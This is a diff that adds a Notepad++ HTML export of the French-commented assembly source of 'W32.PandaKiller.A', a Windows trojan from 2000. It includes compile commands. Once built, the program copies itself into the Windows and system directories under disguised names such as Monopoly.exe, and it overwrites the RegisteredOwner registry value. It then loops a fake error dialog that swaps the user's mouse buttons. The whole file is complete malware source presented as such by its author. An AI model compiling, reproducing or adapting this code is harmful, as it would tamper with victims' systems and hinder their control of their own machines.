@@ -1,0 +1,255 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF8000;
+}
+.sc3 {
+	color: #808080;
+}
+.sc4 {
+	font-weight: bold;
+	color: #000080;
+}
+.sc5 {
+}
+.sc6 {
+	font-weight: bold;
+	color: #0000FF;
+}
+.sc8 {
+	font-weight: bold;
+	color: #8080FF;
+}
+.sc9 {
+	color: #0080FF;
+}
+.sc10 {
+	font-weight: bold;
+	color: #000080;
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment $</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">;                    W32.PandaKiller.A par PandaKiller le 12 octobre 2000</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; CREER DEUX REPERTOIRE : - C:\PandaKiller</span><span class="sc0">
+</span><span class="sc1">;                         - %windir%\Panda</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; S'AUTO-COPIE DANS     : - %windir%\Pandakiller.exe</span><span class="sc0">
+</span><span class="sc1">;                         - %windir%\Panda\Stages.exe</span><span class="sc0">
+</span><span class="sc1">;                         - %system%\Monopoly.exe</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; DESCRIPTION:</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; Dans C:\PandaKiller, il cr‚e le fichier "EMail.txt" o— il ‚crit une adresse</span><span class="sc0">
+</span><span class="sc1">; EMail o— peut nous contacter ainsi qu'un copyright.</span><span class="sc0">
+</span><span class="sc1">; Il affiche un message et change les bouttons de la souris si on clique</span><span class="sc0">
+</span><span class="sc1">; sur r‚‚ssayer et modifie ‚galement le nom d'enregistrement par PandaKiller</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; POUR COMPILER:</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; tasm32 /M /ML PandaKiller.asm</span><span class="sc0">
+</span><span class="sc1">; tlink32 -Tpe -x -aa PandaKiller.obj,,,import32</span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; Lien :  www.coderz.net/matrix</span><span class="sc0">
+</span><span class="sc1">;         www.matrixvx.org</span><span class="sc0">
+</span><span class="sc1">;         www.coderz.net</span><span class="sc0">
+</span><span class="sc1">;         </span><span class="sc0">
+</span><span class="sc1">; </span><span class="sc0">
+</span><span class="sc1">; $</span><span class="sc0">
+
+</span><span class="sc2">.386p</span><span class="sc0">
+</span><span class="sc5">locals</span><span class="sc0">
+</span><span class="sc5">jumps</span><span class="sc0">
+</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
+
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SwapMouseButton</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
+
+</span><span class="sc9">.data</span><span class="sc0">
+</span><span class="sc5">moi</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">targ1</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">targ10</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">fh</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">octets</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">l</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">p</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">CLE</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Software\Microsoft\Windows\CurrentVersion"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">DONNEE</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PandaKiller"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">NOM</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"RegisteredOwner"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+
+</span><span class="sc5">rep1</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\PandaKiller"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">rep2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Panda"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">copie1</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\PandaKiller.exe"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">copie2</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Monopoly.exe"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">copie3</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\Panda\Stages.exe"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">fichier</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\PandaKiller\EMail.txt"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+
+</span><span class="sc5">TITRE</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Par PandaKiller le 12/10/00"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">TEXTE</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"****************************"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Ce fichier n'est pas valide!"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"****************************"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+
+</span><span class="sc5">TXT</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"[PandaKiller]"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Pour tout contact : Panda34@caramail.com"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"VBS/LoveLetter.A"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"VBS/IE55"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"W32.Happy99"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"I-Worm/Kak.A"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"W32.PandaKiller.A par PandaKiller (c)2000"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
+</span><span class="sc5">taille</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">TXT</span><span class="sc0">
+
+</span><span class="sc9">.code</span><span class="sc0">
+
+</span><span class="sc5">DEBUT</span><span class="sc4">:</span><span class="sc0">
+</span><span class="sc5">CREER_REPERTOIRE</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rep1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateDirectoryA</span><span class="sc0">           </span><span class="sc1">;C:\Pandakiller</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rep2</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateDirectoryA</span><span class="sc0">           </span><span class="sc1">;%windir%\Panda</span><span class="sc0">
+
+
+</span><span class="sc5">AUTO_COPIE</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">moi</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">copie1</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">moi</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                  </span><span class="sc1">;%windir%\PandaKiller.exe</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">copie2</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">moi</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                  </span><span class="sc1">;%system%\Monopoly.exe</span><span class="sc0">
+
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ10</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">copie3</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ10</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ10</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">targ1</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                  </span><span class="sc1">;%windir%\Panda\Stages.exe</span><span class="sc0">
+
+
+</span><span class="sc5">FICHIER_TEXTE</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fichier</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
+        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">octets</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">taille</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TXT</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fh</span><span class="sc4">]</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">
+
+
+</span><span class="sc5">REGISTRE</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">p</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1F0000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CLE</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">                  </span><span class="sc1">;HKEY_LOCAL_MACHINE</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DONNEE</span><span class="sc0">              </span><span class="sc1">;PandaKiller</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NOM</span><span class="sc0">                 </span><span class="sc1">;DANS RegisteredOwner</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">p</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">             </span><span class="sc1">;CREE UN REGISTRE</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">                </span><span class="sc1">;FERME LA BASE DE REGISTRE</span><span class="sc0">
+
+
+</span><span class="sc5">MESSAGE</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TITRE</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TEXTE</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">
+        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
+        </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">FIN</span><span class="sc0">
+
+
+
+</span><span class="sc5">SOURIS</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SwapMouseButton</span><span class="sc0">
+        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">MESSAGE</span><span class="sc0">
+    
+</span><span class="sc5">FIN</span><span class="sc4">:</span><span class="sc0">
+        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
+
+</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">DEBUT</span><span class="sc0">
+</span></div></body>
+</html>
